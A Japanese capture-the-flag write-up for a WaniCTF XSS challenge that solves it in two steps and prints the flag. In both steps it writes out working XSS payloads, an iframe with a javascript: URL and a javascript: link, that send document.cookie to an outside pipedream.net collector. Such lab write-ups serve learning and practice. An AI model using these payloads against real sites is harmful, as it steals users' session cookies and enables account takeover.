# Writeup

## PART 1

はじめに https://request2.web.wanictf.org/page1?wani=hoge にアクセスすると、フォームが表示される。

![](img/2021-05-01-14-13-43.png)

`?wani=`に続く部分でXSSできないか調べる。

`<script>`タグは機能しなかったが、`<iframe>`でJavascriptを実行できることが分かった。

```
<iframe src="javascript:location.href='https://enbzubn7wsm68pd.m.pipedream.net/?q='%2bdocument.cookie"></iframe>
```

(%2b = +)

上記をフォームに入力するとクエリパラメータにcookieの値が表示される。

![](img/2021-05-01-14-11-38.png)

```
flag1 = FLAG{y0u_4r3_x55
```

## PART 2

次に https://request2.web.wanictf.org/page2 にアクセスすると、またフォームが表示される。

![](img/2021-05-01-14-19-36.png)

こちらでは、リンクを踏んでくれるらしいので、先ほどと同様に

```
javascript:location.href='https://enbzubn7wsm68pd.m.pipedream.net/?q='%2bdocument.cookie
```

をフォームに入力するとクエリパラメータにcookieの値が表示される。

![](img/2021-05-01-14-18-37.png)

```
flag2 = -60d_c75a4c80cf07}
```

<!-- FLAG{y0u_4r3_x55-60d_c75a4c80cf07} -->
